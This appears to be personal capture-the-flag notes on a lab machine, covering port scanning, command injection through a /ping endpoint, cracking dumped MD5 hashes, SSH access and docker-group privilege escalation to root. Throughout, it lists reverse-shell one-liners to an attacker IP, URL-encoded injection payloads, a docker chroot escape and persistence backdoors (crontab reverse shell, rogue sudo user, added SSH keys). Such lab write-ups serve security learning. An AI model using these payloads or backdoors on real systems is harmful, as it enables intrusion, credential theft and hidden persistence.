lololol

ma aghi dekhi nmap handai thiye lolol vpn nai connect raina raixa

tait

- euta chai bhete
    
    ┌──(namura㉿namu)-[~/thm/ultratech1] └─$ nmap -p8081 -sF 10.10.226.101
    
    Starting Nmap 7.95 ( [](https://nmap.org/)[https://nmap.org](https://nmap.org) ) at 2025-06-18 20:48 +0545 Nmap scan report for 10.10.226.101 Host is up (0.017s latency).
    
    PORT STATE SERVICE 8081/tcp open|filtered blackice-icecap
    
    Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
    
- Alternate vectors
    
    ```jsx
    RCE Detection
    ├── Input: /ping?ip=`id`
    │   └── Response: uid=1001 → Code is executed on backend
    ├── Confirm environment:
    │   ├── /ping?ip=`whoami`
    │   ├── /ping?ip=`uname -a`
    │   └── /ping?ip=`which bash`
    ├── Determine shell and language support:
    │   ├── bash present?
    │   ├── python3 present?
    │   └── nc/netcat present?
    
    ```
    
    ```jsx
    Netcat Listener
    ├── nc -nvlp 4444
    │   └── Wait for incoming connection
    │
    ├── Note:
    │   └── Ensure firewall is open (especially if VPN used)
    │   └── Use tun0 IP (e.g., 10.11.99.99) as callback IP
    
    ```
    
    ```jsx
    Payloads via CMD Injection
    ├── Bash (most reliable)
    │   └── `bash -c 'bash -i >& /dev/tcp/10.11.99.99/4444 0>&1'`
    │
    ├── Python (if bash is restricted)
    │   └── `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.11.99.99",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
    │
    ├── Netcat (if installed)
    │   └── `nc 10.11.99.99 4444 -e /bin/bash`
    │   └── Or: `/bin/nc 10.11.99.99 4444 -e /bin/sh`
    │
    ├── Perl (very rare fallback)
    │   └── `perl -e 'use Socket;$i="10.11.99.99";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    
    ```
    
    ```jsx
    Payload Delivery
    ├── Via Browser or curl (manual test)
    │   └── <http://10.10.43.71:8081/ping?ip=`bash> -c 'bash -i >& /dev/tcp/10.11.99.99/4444 0>&1'`
    │
    ├── Via Burp Suite
    │   ├── Intercept /ping request
    │   ├── Replace ip param with encoded payload
    │   └── Send to Repeater or Forward to server
    │
    ├── URL Encoding Tips
    │   ├── `bash -i >& ...` → special chars need encoding
    │   ├── Use CyberChef to encode:
    │   │   └── Encode backticks: `%60`
    │   │   └── Encode spaces: `%20`
    │   └── Example:
    │       `GET /ping?ip=%60bash+-c+'bash+-i+>%26+/dev/tcp/10.11.99.99/4444+0>%261'%60`
    
    ```
    
    ```jsx
    Shell Stabilization
    ├── If shell is basic or broken:
    │   ├── python3 -c 'import pty; pty.spawn("/bin/bash")'
    │   ├── CTRL+Z
    │   ├── stty raw -echo; fg
    │   └── export TERM=xterm
    │
    ├── Quality of life improvements:
    │   ├── alias, prompt fix, clear
    │   ├── check user + hostname
    │   └── run linpeas.sh for auto-enum
    
    ```
    
    ```jsx
    If Reverse Shell Fails
    ├── Confirm network routing:
    │   ├── ping your IP from victim (if allowed)
    │   ├── nc -zv <attacker-ip> 4444 (from inside)
    │
    ├── Try different methods:
    │   ├── curl + hosted payloads
    │   ├── echo > /tmp + cron shell dropper
    │
    ├── Use webshell instead:
    │   └── Create PHP/JS webshell on exposed file upload
    
    ```
    

# Mindmap

```jsx
ROOT ACCESS
│
├── Initial Recon
│   ├── nmap -sS -p- → ports 21, 22, 8081, 31331
│   ├── FFUF → /partners.html discovered
│   ├── Burp Suite Sitemap + Manual Browsing
│   └── JS Source Review (Node.js Express backend revealed)
│
├── Web Exploitation (Port 8081)
│   ├── Endpoint: /ping?ip= → unsanitized param
│   ├── TypeError → source path leak → index.js
│   ├── Confirmed Command Injection: ip=`id`
│   └── Payloads Tested:
│       ├── `id`, `whoami`, `ls`
│       └── `cat utech.db.sqlite`
│
├── Credential Extraction
│   ├── Dumped SQLite DB via CMDi
│   └── Extracted password hashes or creds
│       └── SSH access to valid user
│
├── Privilege Escalation (Docker Group Abuse)
│   ├── id → User in docker group
│   ├── docker run -v /:/mnt --rm -it bash chroot /mnt sh
│   ├── Chrooted into full root FS
│   └── Read /root/.ssh/id_rsa → full root key
│
└── Shell Secured (Persistence Optional)
    ├── Loaded keys or SSH config
    └── Could create user/add SSH key for backdoor

```

- Big mindmap via command injection and docker abuse
    
    ```jsx
    Initial Recon
    ├── Full TCP Port Scan
    │   └── nmap -sS -p- -oN nmap.all 10.10.43.71
    │       → Ports: 21 (FTP), 22 (SSH), 8081 (Node.js), 31331 (Apache)
    │
    ├── Service & Version Detection
    │   └── nmap -sCV -p21,22,8081,31331 -oN nmap.scripts 10.10.43.71
    │
    ├── Web Enumeration (31331, 8081)
    │   ├── Manual browsing
    │   │   └── Found partners.html → hits /auth endpoint
    │   ├── FFUF directory fuzzing
    │   │   └── ffuf -u <http://10.10.43.71:31331/FUZZ> -w ... 
    │   └── Header & tech checks
    │       └── whatweb, curl -I, Burp headers
    ```
    
    ```jsx
    Command Injection Discovery
    ├── partners.html
    │   └── GET <http://10.10.43.71:8081/auth?login=admin&password=admin> (fails)
    │
    ├── Discovered /ping endpoint on port 8081
    │   └── Triggered error with no params → reveals Express JS source path
    │
    ├── Hypothesis: uses exec() or system() in JS
    │
    ├── Confirm CMDi via backticks
    │   └── /ping?ip=`id`
    │       → Output: uid=1001 confirms RCE
    
    ```
    
    ```jsx
    CMD Injection Exploitation
    ├── Exploiting CMDi for File Read
    │   └── /ping?ip=`cat utech.db.sqlite`
    │       → Extracted user credential hashes
    │
    ├── Alternative Path (not taken here):
    │   └── Send reverse shell:
    │       → bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
    │       → Establish interactive shell
    
    ```
    
    ```jsx
    SSH Foothold
    ├── Brute-force or cracked credentials from SQLite
    ├── SSH login success
    │   └── ssh user@10.10.43.71
    ├── Shell confirmation
    │   └── whoami, id → uid=1001
    
    ```
    
    ```jsx
    Privilege Escalation - Docker
    ├── id → user in docker group
    │
    ├── Attempt docker escape
    │   ├── docker run -it --rm -v /:/mnt bash
    │   │   → failed or insufficient shell
    │   ├── docker run -v /:/mnt --rm -it bash chroot /mnt sh
    │   │   → chroot into host FS as root
    │
    ├── From inside chroot:
    │   ├── cat /root/.ssh/id_rsa
    │   ├── ssh -i id_rsa root@10.10.43.71
    │   └── FULL ROOT ACCESS
    
    ```
    
    ```jsx
    Post-Exploitation
    ├── Shell Stabilization
    │   ├── python3 -c 'import pty; pty.spawn("/bin/bash")'
    │   ├── stty raw -echo; fg
    │   └── export TERM=xterm
    │
    ├── Persistence Techniques
    │   ├── echo YOUR_PUB_KEY >> /root/.ssh/authorized_keys
    │   ├── Add user: useradd hacker -m -s /bin/bash; echo pass | chpasswd
    │   ├── Add to sudo: usermod -aG sudo hacker
    │   └── Crontab backdoor: echo "* * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /etc/crontab
    
    ```
    

---

So, now I’m connected to the server

and we performed nmap aggressive on it nvm, it says >1hr ETA

So, I did a half TCP scan

```jsx
# Nmap 7.95 scan initiated Fri Jun 20 05:47:26 2025 as: /usr/lib/nmap/nmap --privileged -sS -p- -oN nmap.half 10.10.43.71
Nmap scan report for 10.10.43.71
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown

# Nmap done at Fri Jun 20 06:04:19 2025 -- 1 IP address (1 host up) scanned in 1012.59 seconds
```

Did a little but sitemapping, on [`http://10.10.43.71:31331/ultratech@yopmail.com`](http://10.10.43.71:31331/ultratech@yopmail.com) using burp

we get `Apache/2.4.29 (Ubuntu) Server at 10.10.43.71 Port 31331` we got the running version

Same on wappalyzer:

[**Web servers**](https://www.wappalyzer.com/technologies/web-servers/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)

[Apache HTTP Server2.4.29](https://www.wappalyzer.com/technologies/web-servers/apache-http-server/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)

[**Operating systems**](https://www.wappalyzer.com/technologies/operating-systems/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)

[Ubuntu](https://www.wappalyzer.com/technologies/operating-systems/ubuntu/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)

Also we found the ports `8081` and `31331` unusual

8081 seems to be for API

31331 seems to be about-us page

Manually mapped the site and also on burp

![image.png](attachment:7a8d1c97-845b-4194-821f-5353f1510c0b:image.png)

Trying [http://10.10.43.71:31331/robots.txt](http://10.10.43.71:31331/robots.txt)

we see

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

and on the sitemap

```
/
/index.html
/what.html
/partners.html
```

partners is a new one

and we see a login page boom

![image.png](attachment:00504c9d-48c9-411b-b388-fb22682c812e:image.png)

and yes, we can repeat the process on burp

Also fuzzed 8081 first

```jsx
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u <http://10.10.43.71:8081/FUZZ> -of csv -o fuzz.8081.csv

FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile,Ffufhash
auth,<http://10.10.43.71:8081/auth,,751,200,39,8,1,text/html>; charset=utf-8,163.520762ms,,c8f9e2ef
ping,<http://10.10.43.71:8081/ping,,3144,500,1094,52,11,text/html>; charset=utf-8,202.040439ms,,c8f9ec48
```

Similarly for the 31331 port using common seclists wordlist

```jsx
FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile,Ffufhash
.hta,<http://10.10.43.71:31331/.hta,,24,403,293,22,12,text/html>; charset=iso-8859-1,1.307328041s,,2ed5d18
.htaccess,<http://10.10.43.71:31331/.htaccess,,25,403,298,22,12,text/html>; charset=iso-8859-1,3.317693614s,,2ed5d19
.htpasswd,<http://10.10.43.71:31331/.htpasswd,,26,403,298,22,12,text/html>; charset=iso-8859-1,4.324740068s,,2ed5d1a
css,<http://10.10.43.71:31331/css,http://10.10.43.71:31331/css/,1339,301,317,20,10,text/html>; charset=iso-8859-1,164.035153ms,,2ed5d53b
favicon.ico,<http://10.10.43.71:31331/favicon.ico,,1772,200,15086,11,7,image/vnd.microsoft.icon,174.09334ms,,2ed5d6ec>
images,<http://10.10.43.71:31331/images,http://10.10.43.71:31331/images/,2182,301,320,20,10,text/html>; charset=iso-8859-1,166.136854ms,,2ed5d886
index.html,<http://10.10.43.71:31331/index.html,,2209,200,6092,393,140,text/html,177.142169ms,,2ed5d8a1>
javascript,<http://10.10.43.71:31331/javascript,http://10.10.43.71:31331/javascript/,2334,301,324,20,10,text/html>; charset=iso-8859-1,176.461522ms,,2ed5d91e
js,<http://10.10.43.71:31331/js,http://10.10.43.71:31331/js/,2366,301,316,20,10,text/html>; charset=iso-8859-1,178.764222ms,,2ed5d93e
robots.txt,<http://10.10.43.71:31331/robots.txt,,3594,200,53,4,6,text/plain,180.054842ms,,2ed5de0a>
server-status,<http://10.10.43.71:31331/server-status,,3736,403,302,22,12,text/html>; charset=iso-8859-1,170.891152ms,,2ed5de98
```

Then we checked out the `/ping` endpoint and found out we could RCE via Burp, then we tried some commands like `ls` and `pwd` via [https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list) but didn’t RCE as the the low hanging fruit was right there after a few basic commands

- [http://10.10.43.71:8081/ping](http://10.10.43.71:8081/ping)
    
    ```jsx
    TypeError: Cannot read property 'replace' of undefined
        at app.get (/home/www/api/index.js:45:29)
        at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
        at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
        at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
        at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
        at /home/www/api/node_modules/express/lib/router/index.js:281:22
        at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
        at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
        at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
        at /home/www/api/node_modules/cors/lib/index.js:224:17
    ```
    
- [http://10.10.43.71:8081/auth?login=admin&password=admin](http://10.10.43.71:8081/auth?login=admin&password=admin)
    
    Invalid credentials
    
    ```jsx
    GET /auth?login=admin&password=admin HTTP/1.1
    Host: 10.10.43.71:8081
    Accept-Language: en-US,en;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: <http://10.10.43.71:31331/>
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    
    ```
    
- some payload
    
    ```jsx
    GET /ping?ip=`;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.17.19.181",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` HTTP/1.1
    Host: 10.10.43.71:8081
    Accept-Language: en-US,en;q=0.9
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
    Accept: */*
    Origin: <http://10.10.43.71:31331>
    Referer: <http://10.10.43.71:31331/>
    Accept-Encoding: gzip, deflate, br
    If-None-Match: W/"103-g+tcKAgZoph7CeOD6kJXoXWFEqc"
    Connection: keep-alive
    
    ```
    

Then we did

```jsx
[<http://10.10.43.71:8081/ping?ip=`cat> utech.db.sqlite`](<http://10.10.43.71:8081/ping?ip=%60cat%20utech.db.sqlite%60>)
```

and we got

![image.png](attachment:c71cb4a1-c30f-49db-8ab8-7d28403fd82c:image.png)

then we get hashes and then we matched the db and got

|Hash|Type|Result|
|---|---|---|
|f357a0c52799563c7c7b76c1e7543a32|md5|n100906|
|0d0ea5111e3c1def594c1684e3b9be84|md5|mrsheafy|

Then we tried to ssh to user `r00t` via ssh and it works~

then we did a little digging

- Basic checking
    
    ```jsx
    r00t@ultratech-prod:~$ ls
    r00t@ultratech-prod:~$ whoami
    r00t
    r00t@ultratech-prod:/$ sudo su
    [sudo] password for r00t: 
    r00t is not in the sudoers file.  This incident will be reported.
    r00t@ultratech-prod:/etc$ id
    uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
    r00t@ultratech-prod:/etc$ sudo -l
    [sudo] password for r00t: 
    Sorry, user r00t may not run sudo on ultratech-prod.
    
    ```
    

And we saw that are in a docker group

Tried a few payloads

```jsx
r00t@ultratech-prod:/etc$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```

This one worked and we cat the id_rsa

```jsx
# cat /root/.ssh/id_rsa
```

And we get the ssh key yay~